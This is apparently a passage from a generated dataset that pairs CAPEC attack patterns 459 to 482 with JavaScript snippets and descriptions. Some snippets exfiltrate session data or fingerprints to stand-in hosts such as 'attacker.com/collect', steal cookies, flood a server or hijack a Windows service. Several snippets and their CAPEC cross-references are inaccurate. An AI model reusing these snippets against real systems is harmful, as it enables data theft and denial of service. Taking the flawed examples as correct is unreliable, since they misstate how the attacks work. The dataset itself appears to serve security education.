        "code_snippet": "const fs = require('fs');\n\n// Simulate flashing malicious code into a device's memory\nfunction flashMaliciousCode(memoryPath, maliciousCode) {\n  // CWE-1282: Storing assumed-immutable data in writable memory\n  if (fs.existsSync(memoryPath)) {\n    // CWE-506: Embedding malicious code\n    fs.writeFileSync(memoryPath, maliciousCode);\n    console.log('Malicious code flashed into memory.');\n  } else {\n    console.log('Memory path does not exist.');\n  }\n}\n\n// Example usage\nconst memoryPath = '/path/to/flash/memory';\nconst maliciousCode = 'malicious_rootkit_code';\nflashMaliciousCode(memoryPath, maliciousCode);",
        "description": "This JavaScript code snippet simulates a flash memory attack by writing malicious code into a specified memory path. The function `flashMaliciousCode` takes a memory path and malicious code as arguments. It checks if the memory path exists (CWE-1282: Assumed-Immutable Data is Stored in Writable Memory) and then writes the malicious code to that path (CWE-506: Embedded Malicious Code). This represents the main idea of the CAPEC, where an adversary inserts malicious logic into a product via flashing the on-board memory. The code is a simplified representation and does not perform actual flashing but demonstrates the concept."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "const crypto = require('crypto');\nconst fs = require('fs');\n\n// Simulate a weak hashing algorithm (e.g., MD5)\nfunction generateWeakHash(data) {\n  return crypto.createHash('md5').update(data).digest('hex');\n}\n\n// Generate two different CSRs with the same hash\nconst csr1 = 'CSR data for legitimate certificate';\nconst csr2 = 'CSR data for rogue certificate';\n\nconst hash1 = generateWeakHash(csr1);\nconst hash2 = generateWeakHash(csr2);\n\nif (hash1 === hash2) {\n  console.log('Hash collision found! Both CSRs have the same hash.');\n  // Simulate signing the first CSR by a trusted CA\n  const signedBlob = 'Signed blob by CA';\n\n  // Use the signed blob to create a rogue certificate\n  const rogueCertificate = `Rogue Certificate with signed blob: ${signedBlob}`;\n  console.log('Rogue Certificate:', rogueCertificate);\n} else {\n  console.log('No hash collision.');\n}",
        "description": "This JavaScript code snippet demonstrates the concept of creating a rogue certification authority certificate by exploiting a weak hashing algorithm (MD5 in this case). The code generates two different Certificate Signing Requests (CSRs) that result in the same hash due to the weak collision resistance of the MD5 algorithm. Once a hash collision is found, it simulates the signing of the first CSR by a trusted Certificate Authority (CA) and then uses the signed blob to create a rogue certificate. This rogue certificate appears to be signed by the trusted CA, even though the CA has never seen it. This embodies the main idea of the CAPEC by showing how an adversary can exploit weak cryptographic algorithms to create fraudulent certificates."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const url = new URL(req.url, `http://${req.headers.host}`);\n  const params = url.searchParams;\n\n  // Vulnerable code: Improper handling of duplicate parameters\n  let user = params.get('user');\n  let role = params.get('role');\n\n  // Example of sensitive information in GET request\n  if (user && role) {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`User: ${user}, Role: ${role}`);\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Missing parameters');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that processes GET requests and extracts 'user' and 'role' parameters from the query string. The code is vulnerable to HTTP Parameter Pollution (HPP) because it does not properly handle duplicate parameters. An attacker could inject additional 'user' or 'role' parameters to manipulate the application's behavior. Additionally, the code demonstrates the use of sensitive information in a GET request, which is a security risk. This snippet embodies the main idea of CAPEC-460 by showing how improper handling of HTTP parameters can lead to security vulnerabilities, including those described in related CWEs such as improper neutralization of input terminators and improper handling of extra parameters."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak hash function (MD5) used for generating signature\nfunction generateSignature(params, secret) {\n  const hash = crypto.createHash('md5');\n  hash.update(params + secret);\n  return hash.digest('hex');\n}\n\n// Simulated API request with weak authentication\nfunction apiRequest(params, signature) {\n  const secret = 'supersecret'; // Secret known only to the server\n  const expectedSignature = generateSignature(params, secret);\n  if (signature === expectedSignature) {\n    console.log('Authenticated successfully');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Adversary's attempt to forge a signature using hash extension attack\nconst maliciousParams = 'user=attacker&role=admin';\nconst forgedSignature = generateSignature(maliciousParams, ''); // Secret is unknown\napiRequest(maliciousParams, forgedSignature);",
        "description": "This JavaScript code snippet demonstrates a vulnerable web service API that uses a weak hash function (MD5) for generating signatures. The `generateSignature` function creates a hash based on the provided parameters and a secret. The `apiRequest` function simulates an API request that checks the provided signature against the expected signature. An adversary can exploit the hash function extension weakness by generating a forged signature without knowing the secret, as shown in the last part of the code. This represents the CAPEC scenario where an attacker leverages a weak hash function to bypass authentication."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "const urls = ['https://example.com/api/data1', 'https://example.com/api/data2'];\n\nfunction timeRequest(url) {\n  return new Promise((resolve) => {\n    const start = performance.now();\n    fetch(url, { mode: 'no-cors' })\n      .then(() => resolve(performance.now() - start))\n      .catch(() => resolve(performance.now() - start));\n  });\n}\n\nasync function measureTimings() {\n  for (const url of urls) {\n    const time = await timeRequest(url);\n    console.log(`Time for ${url}: ${time}ms`);\n  }\n}\n\nmeasureTimings();",
        "description": "This JavaScript code snippet demonstrates a Cross-Domain Search Timing attack. The attacker initiates cross-domain HTTP GET requests to two different URLs and measures the time taken for each request to complete. The 'fetch' function is used with 'no-cors' mode to bypass the same-origin policy, which prevents reading the response but allows timing the request. The 'performance.now()' function is used to measure the time taken for each request. By analyzing the timing discrepancies, the attacker can infer information about the server's state or the data being processed, even without directly accessing the response content. This code embodies the main idea of CAPEC-115 and is related to CWEs such as Covert Timing Channel (CWE-385) and Observable Timing Discrepancy (CWE-208)."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "const crypto = require('crypto');\n\nfunction decrypt(ciphertext, key) {\n  const decipher = crypto.createDecipheriv('aes-256-cbc', key, ciphertext.slice(0, 16));\n  let decrypted = Buffer.concat([decipher.update(ciphertext.slice(16)), decipher.final()]);\n  try {\n    // Check padding\n    const paddingLength = decrypted[decrypted.length - 1];\n    if (paddingLength > 16) throw new Error('Invalid padding');\n    for (let i = 1; i <= paddingLength; i++) {\n      if (decrypted[decrypted.length - i] !== paddingLength) throw new Error('Invalid padding');\n    }\n    decrypted = decrypted.slice(0, -paddingLength);\n  } catch (e) {\n    // Leaking padding error information\n    console.error('Padding error:', e.message);\n    throw e;\n  }\n  return decrypted;\n}\n\n// Example usage\nconst key = crypto.randomBytes(32);\nconst iv = crypto.randomBytes(16);\nconst cipher = crypto.createCipheriv('aes-256-cbc', key, iv);\nlet ciphertext = Buffer.concat([iv, cipher.update('Sensitive data'), cipher.final()]);\n\ntry {\n  const plaintext = decrypt(ciphertext, key);\n  console.log('Decrypted text:', plaintext.toString());\n} catch (e) {\n  console.error('Decryption failed:', e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable decryption function that is susceptible to a Padding Oracle Crypto Attack. The function `decrypt` attempts to decrypt a given ciphertext using AES-256-CBC. It checks the padding of the decrypted data and throws an error if the padding is invalid. The error message is logged, which leaks information about the padding error. An attacker can exploit this information to decrypt the ciphertext without knowing the key by repeatedly modifying the ciphertext and observing the error messages. This code embodies the main idea of CAPEC-463 (Padding Oracle Crypto Attack) and highlights CWE-209 (Generation of Error Message Containing Sensitive Information) and CWE-649 (Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking)."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "function setEvercookie(name, value) {\n    var storage = [localStorage, sessionStorage, document.cookie];\n    var flashLSO = new FlashLSO(); // Hypothetical Flash Local Shared Object API\n    var userData = new UserData(); // Hypothetical UserData API\n\n    function saveToAllStorages() {\n        storage.forEach(function(store) {\n            if (store === document.cookie) {\n                document.cookie = name + '=' + value + '; path=/';\n            } else {\n                store.setItem(name, value);\n            }\n        });\n        flashLSO.setItem(name, value);\n        userData.setItem(name, value);\n    }\n\n    function restoreFromAnyStorage() {\n        var restoredValue = null;\n        storage.forEach(function(store) {\n            if (store === document.cookie) {\n                var cookies = document.cookie.split('; ');\n                cookies.forEach(function(cookie) {\n                    var parts = cookie.split('=');\n                    if (parts[0] === name) restoredValue = parts[1];\n                });\n            } else if (store.getItem(name)) {\n                restoredValue = store.getItem(name);\n            }\n        });\n        if (flashLSO.getItem(name)) restoredValue = flashLSO.getItem(name);\n        if (userData.getItem(name)) restoredValue = userData.getItem(name);\n        return restoredValue;\n    }\n\n    var existingValue = restoreFromAnyStorage();\n    if (existingValue !== value) {\n        saveToAllStorages();\n    }\n}\n\n// Usage\nsetEvercookie('userSession', 'sensitiveData');",
        "description": "This JavaScript code snippet demonstrates the concept of an 'evercookie', which is a highly persistent cookie that remains on the user's machine even after attempts to delete it. The code stores the cookie in multiple locations, including localStorage, sessionStorage, document.cookie, and hypothetical Flash Local Shared Objects (LSO) and UserData APIs. When the cookie is set, it is saved to all these storage locations. If the cookie is deleted from some but not all locations, the code can restore it from any remaining location, ensuring its persistence. This approach embodies the CAPEC's idea of creating a resilient cookie that is difficult to remove completely. The related CWEs highlight the risks associated with storing sensitive information in cookies, especially without proper validation, integrity checking, and encryption."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "const http = require('http');\n\nconst proxy = http.createServer((req, res) => {\n  const options = {\n    hostname: 'example.com',\n    port: 80,\n    path: req.url,\n    method: req.method,\n    headers: req.headers\n  };\n\n  const proxyReq = http.request(options, (proxyRes) => {\n    proxyRes.pipe(res, {\n      end: true\n    });\n  });\n\n  req.pipe(proxyReq, {\n    end: true\n  });\n});\n\nproxy.listen(8080, () => {\n  console.log('Proxy server is running on port 8080');\n});",
        "description": "This JavaScript code snippet sets up a basic HTTP proxy server using Node.js. The proxy server listens on port 8080 and forwards incoming client requests to 'example.com'. The proxy server does not modify the requests or responses, making it transparent to the client. This code embodies the main idea of CAPEC-171 (Transparent Proxy Abuse) by acting as an intermediary that forwards requests and responses without the client's knowledge. The code also touches on related CWEs: \n- CWE-441 (Unintended Proxy or Intermediary) as the proxy server forwards requests without preserving the original source.\n- CWE-444 (Inconsistent Interpretation of HTTP Requests) as the proxy server may not handle malformed HTTP requests consistently.\n- CWE-602 (Client-Side Enforcement of Server-Side Security) as the proxy relies on the client to enforce security.\n- CWE-212 (Improper Removal of Sensitive Information) as the proxy does not remove sensitive information before forwarding.\n- CWE-941 (Incorrectly Specified Destination) as the proxy could potentially forward requests to incorrect destinations if not properly configured."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "const targetUrl = 'http://example.com/api/data';\n\nfetch(targetUrl)\n  .then(response => response.json())\n  .then(data => {\n    console.log('Data received:', data);\n  })\n  .catch(error => {\n    console.error('Error fetching data:', error);\n  });",
        "description": "This JavaScript code snippet demonstrates a fetch request to a non-TLS (HTTP) endpoint, which is vulnerable to an active adversary in the middle attack. The attacker can intercept and manipulate the communication between the client and the server, bypassing the same origin policy. This vulnerability is exacerbated by CWE-300 (Channel Accessible by Non-Endpoint) and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), as the communication channel is not adequately secured. The code also implicitly relies on client-side enforcement of security (CWE-602), making it easier for an attacker to exploit the vulnerability."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "const socialNetworkAPI = 'https://socialnetwork.com/api/userinfo';\n\nfunction stealUserInfo() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('GET', socialNetworkAPI, true);\n  xhr.withCredentials = true;\n  xhr.onreadystatechange = function() {\n    if (xhr.readyState === 4 && xhr.status === 200) {\n      const userInfo = JSON.parse(xhr.responseText);\n      sendToAttacker(userInfo);\n    }\n  };\n  xhr.send();\n}\n\nfunction sendToAttacker(data) {\n  const attackerServer = 'https://attacker.com/collect';\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', attackerServer, true);\n  xhr.setRequestHeader('Content-Type', 'application/json');\n  xhr.send(JSON.stringify(data));\n}\n\n// Trigger the attack\nstealUserInfo();",
        "description": "This JavaScript code snippet demonstrates a Cross Site Identification attack. The `stealUserInfo` function sends a GET request to a social networking site's API endpoint to retrieve user information. The request includes credentials (`xhr.withCredentials = true`), exploiting the user's active session. Once the information is retrieved, it is sent to the attacker's server using the `sendToAttacker` function. This attack leverages several vulnerabilities: CSRF (CWE-352) by making unauthorized requests, Exposure of Private Personal Information (CWE-359) by accessing user data without consent, and potentially Session Fixation (CWE-384) if the session is not properly managed. The use of GET requests (CWE-598) and improper input handling (CWE-79) are also implied risks."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "const targetDomain = 'https://victim.com';\nconst cssUrl = `${targetDomain}/styles.css?cookie=${document.cookie}`;\n\nconst link = document.createElement('link');\nlink.rel = 'stylesheet';\nlink.href = cssUrl;\ndocument.head.appendChild(link);",
        "description": "This JavaScript code snippet demonstrates a Generic Cross-Browser Cross-Domain Theft attack. The attacker creates a link element that points to a CSS file on the target domain, appending the victim's cookies to the URL as a query parameter. When the browser loads the CSS file, it sends the cookies to the target domain. This exploits the fact that browsers send cookies with cross-domain CSS requests and that CSS parsers ignore non-CSS data, allowing the attacker to steal cookies. The code leverages CWE-707 (Improper Neutralization) by not properly handling the input (cookies) before sending it to the target domain, CWE-149 (Improper Neutralization of Quoting Syntax) by potentially mishandling quotes in the cookie data, CWE-177 (Improper Handling of URL Encoding) by not encoding the cookie data properly, CWE-838 (Inappropriate Encoding for Output Context) by not ensuring the correct encoding for the URL, and CWE-79 (Cross-site Scripting) by injecting user-controllable input (cookies) into the URL."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/',\n  method: 'GET',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded'\n  }\n};\n\nfunction flood() {\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {\n      // Keep the connection alive by not ending the response\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.write('data=keep-alive');\n  // Do not call req.end() to keep the connection open\n}\n\nfor (let i = 0; i < 1000; i++) {\n  flood();\n}",
        "description": "This JavaScript code snippet demonstrates an HTTP DoS attack by flooding a target server with HTTP requests that are kept alive indefinitely. The 'flood' function creates an HTTP request to the target server and deliberately does not end the request, keeping the connection open. By running this function multiple times in a loop, the attacker can exhaust the server's resources, leading to a denial of service. This code embodies the main idea of CAPEC-HTTP DoS by exploiting resource allocation without limits (CWE-770), insufficient resource pool (CWE-410), and missing release of resources (CWE-772)."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test_db'\n});\n\napp.use(express.json());\n\napp.post('/execute', (req, res) => {\n  const userInput = req.body.query;\n  connection.query(userInput, (error, results) => {\n    if (error) {\n      return res.status(500).send('Error executing query');\n    }\n    res.send(results);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that connects to a MySQL database. It includes an endpoint '/execute' that takes a SQL query from the request body and executes it directly on the database. This code is vulnerable to SQL Injection (CWE-89) because it directly uses user input to construct SQL commands without any sanitization or parameterization. If an attacker sends a malicious SQL query, they could potentially gain unauthorized access to the database and underlying operating system, embodying the main idea of CAPEC-118. Additionally, the database connection is established with root privileges (CWE-250), which amplifies the potential damage an attacker could cause. The code snippet demonstrates how improper handling of user input and excessive privileges can lead to severe security vulnerabilities."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadLibrary(libName) {\n  const searchPaths = [\n    path.join(__dirname, libName),\n    path.join('/usr/local/lib', libName),\n    path.join('/usr/lib', libName)\n  ];\n\n  for (const searchPath of searchPaths) {\n    if (fs.existsSync(searchPath)) {\n      return require(searchPath);\n    }\n  }\n\n  throw new Error('Library not found');\n}\n\n// Example usage\ntry {\n  const myLib = loadLibrary('myLibrary.js');\n  myLib.doSomething();\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of library loading that embodies the concept of 'Search Order Hijacking' (CAPEC-471). The `loadLibrary` function searches for a library in a predefined set of directories. The search order starts with the current directory (`__dirname`), followed by system directories (`/usr/local/lib` and `/usr/lib`). An attacker could exploit this by placing a malicious library in the current directory, which would be loaded preferentially over the legitimate library in the system directories. This vulnerability is related to CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path), as the search path includes directories that could be controlled by an attacker. The code does not verify the integrity or authenticity of the library being loaded, making it susceptible to hijacking."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "function getBrowserFingerprint() {\n    var fingerprint = '';\n    fingerprint += 'Browser Name: ' + navigator.appName + '\\n';\n    fingerprint += 'Browser Version: ' + navigator.appVersion + '\\n';\n    fingerprint += 'User Agent: ' + navigator.userAgent + '\\n';\n    fingerprint += 'Platform: ' + navigator.platform + '\\n';\n    fingerprint += 'Cookies Enabled: ' + navigator.cookieEnabled + '\\n';\n    fingerprint += 'Language: ' + navigator.language + '\\n';\n    return fingerprint;\n}\n\nfunction sendFingerprint() {\n    var xhr = new XMLHttpRequest();\n    var fingerprint = getBrowserFingerprint();\n    xhr.open('GET', 'http://malicious.example.com/collect?data=' + encodeURIComponent(fingerprint), true);\n    xhr.send();\n}\n\nsendFingerprint();",
        "description": "This JavaScript code snippet demonstrates a basic browser fingerprinting technique. The `getBrowserFingerprint` function collects various pieces of information about the user's browser, such as the browser name, version, user agent, platform, whether cookies are enabled, and the language. This information is then sent to a malicious server using an HTTP GET request in the `sendFingerprint` function. This code embodies the main idea of CAPEC-200: Browser Fingerprinting, by collecting detailed information about the user's browser to potentially exploit known vulnerabilities. The use of an HTTP GET request with sensitive information in the query string (CWE-598) and the potential exposure of sensitive information to an unauthorized actor (CWE-200) are also demonstrated in this snippet."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(message, signature, publicKey) {\n  const verifier = crypto.createVerify('SHA1'); // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n  verifier.update(message);\n  return verifier.verify(publicKey, signature, 'hex');\n}\n\nfunction receiveMessage(message, signature, publicKey) {\n  if (!verifySignature(message, signature, publicKey)) { // CWE-290: Authentication Bypass by Spoofing\n    console.log('Signature verification failed.');\n    return;\n  }\n  console.log('Message received:', message);\n}\n\n// Simulated message reception\nconst message = 'Important data';\nconst signature = 'fake_signature'; // CWE-20: Improper Input Validation\nconst publicKey = 'fake_public_key';\nreceiveMessage(message, signature, publicKey);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of message signature verification, embodying the main idea of the CAPEC 'Signature Spoof'. The `verifySignature` function uses the SHA1 algorithm (CWE-327: Use of a Broken or Risky Cryptographic Algorithm) to verify the signature of a message. The `receiveMessage` function checks the signature and logs the message if the signature is valid. However, the code is vulnerable to signature spoofing due to the use of a weak cryptographic algorithm and improper input validation (CWE-20). An attacker could exploit these weaknesses to spoof a signature and deceive the recipient into accepting a malicious message."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulate insecure storage of private key\nlet privateKey = '-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC...\\n-----END PRIVATE KEY-----';\n\n// Function to sign a message\nfunction signMessage(message) {\n  const sign = crypto.createSign('SHA256');\n  sign.update(message);\n  sign.end();\n  const signature = sign.sign(privateKey, 'hex');\n  return signature;\n}\n\n// Simulate an attacker stealing the private key\nlet stolenPrivateKey = privateKey;\n\n// Attacker uses the stolen key to sign a malicious message\nfunction attackerSignMessage(maliciousMessage) {\n  const sign = crypto.createSign('SHA256');\n  sign.update(maliciousMessage);\n  sign.end();\n  const maliciousSignature = sign.sign(stolenPrivateKey, 'hex');\n  return maliciousSignature;\n}\n\n// Example usage\nconst originalMessage = 'Transfer $1000 to account XYZ';\nconst maliciousMessage = 'Transfer $10000 to account ABC';\n\nconsole.log('Original Signature:', signMessage(originalMessage));\nconsole.log('Malicious Signature:', attackerSignMessage(maliciousMessage));",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker steals a private key and uses it to sign a malicious message. The private key is stored insecurely, making it susceptible to theft (CWE-522). The attacker then uses the stolen key to create a signature for a malicious message, which can mislead a victim into performing actions that benefit the attacker (CAPEC-243). The code highlights the importance of securely storing private keys and ensuring robust authentication mechanisms to prevent such attacks."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(data, signature, publicKey) {\n  const verifier = crypto.createVerify('SHA256');\n  verifier.update(data);\n  verifier.end();\n  // Improper verification: does not check the return value of verify()\n  verifier.verify(publicKey, signature);\n}\n\n// Example usage\nconst data = 'Important data';\nconst signature = 'fakeSignature';\nconst publicKey = '-----BEGIN PUBLIC KEY-----\\n...\\n-----END PUBLIC KEY-----';\n\nverifySignature(data, signature, publicKey);",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to 'Signature Spoofing by Improper Validation' (CAPEC). The `verifySignature` function uses the `crypto` module to verify a cryptographic signature. However, it fails to check the return value of the `verifier.verify()` method, which is crucial for determining if the signature is valid. This improper verification (CWE-347) can be exploited by an adversary to spoof the signature, leading to potential authentication bypass (CWE-290). The code also implicitly highlights the use of potentially risky cryptographic algorithms (CWE-327) and improper certificate validation (CWE-295) by not ensuring the integrity and authenticity of the public key."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(message, signature, publicKey) {\n  const verifier = crypto.createVerify('SHA256');\n  verifier.update(message);\n  verifier.end();\n  return verifier.verify(publicKey, signature, 'hex');\n}\n\nfunction spoofSignature(message, fakeSignature, fakePublicKey) {\n  if (verifySignature(message, fakeSignature, fakePublicKey)) {\n    console.log('Signature verified. Proceeding with action...');\n    // Perform some action assuming the signature is valid\n  } else {\n    console.log('Signature verification failed.');\n  }\n}\n\nconst message = 'Important transaction data';\nconst fakeSignature = 'abcdef1234567890'; // Fake signature\nconst fakePublicKey = '-----BEGIN PUBLIC KEY-----\\n...\\n-----END PUBLIC KEY-----'; // Fake public key\n\nspoofSignature(message, fakeSignature, fakePublicKey);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can spoof a cryptographic signature by misrepresenting the signer's identity. The `verifySignature` function is intended to verify the authenticity of a message using a given signature and public key. However, the `spoofSignature` function uses a fake signature and a fake public key to trick the verification process. If the verification succeeds, it proceeds with an action assuming the signature is valid. This embodies the CAPEC of 'Signature Spoofing by Misrepresentation' and highlights related CWEs such as 'Improper Verification of Cryptographic Signature' (CWE-347) and 'Authentication Bypass by Spoofing' (CWE-290)."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "function processData(data) {\n  if (data.isSigned) {\n    if (verifySignature(data)) {\n      console.log('Signed data processed:', data.content);\n    } else {\n      console.log('Invalid signature.');\n    }\n  } else {\n    console.log('Unsigned data processed:', data.content);\n  }\n}\n\nfunction verifySignature(data) {\n  // Simulate signature verification\n  return data.signature === 'valid_signature';\n}\n\n// Example usage\nconst signedData = { isSigned: true, content: 'Sensitive Info', signature: 'valid_signature' };\nconst unsignedData = { isSigned: false, content: 'Non-sensitive Info' };\n\nprocessData(signedData);\nprocessData(unsignedData);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where both signed and unsigned data are processed by the same function. The `processData` function checks if the data is signed and attempts to verify the signature using the `verifySignature` function. If the data is unsigned, it is processed without any verification. This setup can be exploited by an attacker to inject unsigned data and have it processed as if it were signed, leading to potential security issues. The code embodies the main idea of CAPEC-493 by showing how mixing signed and unsigned content can lead to improper handling of data. The related CWEs are represented by the lack of proper protection mechanisms (CWE-693), missing encryption (CWE-311), cleartext transmission (CWE-319), and improper verification of cryptographic signatures (CWE-347)."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "const { exec } = require('child_process');\nconst fs = require('fs');\n\n// CWE-284: Improper Access Control\n// CWE-15: External Control of System or Configuration Setting\nconst serviceConfigPath = 'C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\serviceConfig.json';\n\n// CWE-520: .NET Misconfiguration: Use of Impersonation\nconst maliciousBinaryPath = 'C:\\malicious\\malicious.exe';\n\n// Read the current service configuration\nfs.readFile(serviceConfigPath, 'utf8', (err, data) => {\n  if (err) throw err;\n  let config = JSON.parse(data);\n\n  // Modify the service configuration to point to the malicious binary\n  config.serviceExecutable = maliciousBinaryPath;\n\n  // Write the modified configuration back to the file\n  fs.writeFile(serviceConfigPath, JSON.stringify(config), 'utf8', (err) => {\n    if (err) throw err;\n    console.log('Service configuration modified to execute malicious binary.');\n\n    // Restart the service to apply the new configuration\n    exec('net stop MyService && net start MyService', (err, stdout, stderr) => {\n      if (err) {\n        console.error(`exec error: ${err}`);\n        return;\n      }\n      console.log(`stdout: ${stdout}`);\n      console.error(`stderr: ${stderr}`);\n    });\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a potential attack where an adversary modifies the configuration of a Windows service to execute a malicious binary. The code reads the current service configuration from a JSON file, modifies the path of the service executable to point to a malicious binary, writes the modified configuration back to the file, and then restarts the service to apply the new configuration. This embodies the CAPEC 'Modification of Windows Service Configuration' and leverages CWE-284 (Improper Access Control) and CWE-15 (External Control of System or Configuration Setting) by assuming the attacker has the necessary permissions to modify the service configuration file and restart the service."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Load a malicious root certificate\nconst maliciousRootCert = fs.readFileSync('malicious-root-cert.pem');\n\n// Create an HTTPS agent that uses the malicious root certificate\nconst agent = new https.Agent({\n  ca: maliciousRootCert,\n  rejectUnauthorized: false // CWE-295: Improper Certificate Validation\n});\n\n// Make a request to a spoofed website\nhttps.get('https://spoofed-website.com', { agent }, (res) => {\n  let data = '';\n\n  // A chunk of data has been received.\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  // The whole response has been received.\n  res.on('end', () => {\n    console.log('Response:', data);\n  });\n}).on('error', (e) => {\n  console.error('Error:', e);\n});",
        "description": "This JavaScript code snippet demonstrates how an adversary might exploit a weakness in certificate validation to install a malicious root certificate and use it to intercept HTTPS requests. The code loads a malicious root certificate and creates an HTTPS agent that uses this certificate. It then makes a request to a spoofed website using this agent. The 'rejectUnauthorized: false' setting (CWE-295) disables proper certificate validation, allowing the connection to proceed without verifying the certificate's authenticity. This can lead to users unknowingly connecting to malicious servers, potentially exposing sensitive information."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "const vm = require('vm');\n\n// Simulate a virtualized environment\nconst sandbox = { user: 'guest', sensitiveData: 'secret' };\nvm.createContext(sandbox);\n\n// Vulnerable code: Improper isolation and protection mechanism failure\ntry {\n  vm.runInContext(`\n    // Malicious code escaping the sandbox\n    this.process = process;\n    this.fs = require('fs');\n    this.fs.writeFileSync('/tmp/escaped.txt', 'Escaped the sandbox!');\n  `, sandbox);\n} catch (e) {\n  console.error('Error:', e);\n}\n\n// Check if the sandbox was escaped\nconst fs = require('fs');\nif (fs.existsSync('/tmp/escaped.txt')) {\n  console.log('Sandbox escape successful!');\n} else {\n  console.log('Sandbox escape failed.');\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can escape a virtualized environment (sandbox) and gain unauthorized access to the host system. The code uses Node.js's 'vm' module to create a sandboxed environment. However, due to improper isolation and protection mechanism failure, the malicious code within the sandbox is able to access the 'process' and 'fs' modules, allowing it to write a file to the host system, thus escaping the sandbox. This represents the main idea of CAPEC-272 (Escaping Virtualization) and highlights related CWEs such as improper isolation (CWE-653) and protection mechanism failure (CWE-693)."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'trusted-domain.com',\n  port: 443,\n  path: '/api/data',\n  method: 'GET',\n  headers: {\n    'Host': 'malicious-domain.com'\n  }\n};\n\nconst req = https.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log(data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a simplified example of 'Contradictory Destinations in Traffic Routing Schemes' by using different domain names in the 'hostname' and 'Host' fields. The 'hostname' field is set to 'trusted-domain.com', while the 'Host' header is set to 'malicious-domain.com'. This discrepancy can lead to traffic being routed incorrectly, potentially allowing an adversary to intercept or manipulate the communication. This example embodies CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) and CWE-941 (Incorrectly Specified Destination in a Communication Channel) by not ensuring the communication is with the correct endpoint and specifying an incorrect destination."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
